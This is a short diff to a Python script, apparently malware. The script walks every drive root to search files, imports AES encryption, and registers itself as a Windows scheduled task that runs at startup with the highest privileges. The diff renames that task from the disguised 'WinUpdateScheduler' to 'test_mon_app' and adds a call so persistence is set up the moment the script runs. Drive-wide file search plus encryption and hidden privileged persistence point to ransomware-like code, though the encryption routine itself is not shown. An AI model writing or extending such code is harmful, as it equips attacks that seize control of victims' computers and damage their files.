@@ -1,6 +1,7 @@
 import os
 import string
 from pathlib import Path
+import sys
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -39,7 +40,7 @@ max_size = 100 * 1024 * 1024
 def ajouter_tache_planifiee():
     try:
         script_path = os.path.realpath(sys.argv[0])
-        task_name = "WinUpdateScheduler"
+        task_name = "test_mon_app"
 
         cmd = f"""
         schtasks /create /tn "{task_name}" /tr "{script_path}" /sc ONSTART /RL HIGHEST /f
@@ -115,6 +116,7 @@ def search_file(base_path):
 
 
 def main():
+    ajouter_tache_planifiee()
     paths = get_existing_root_path()
     for path in paths:
         search_file(path)
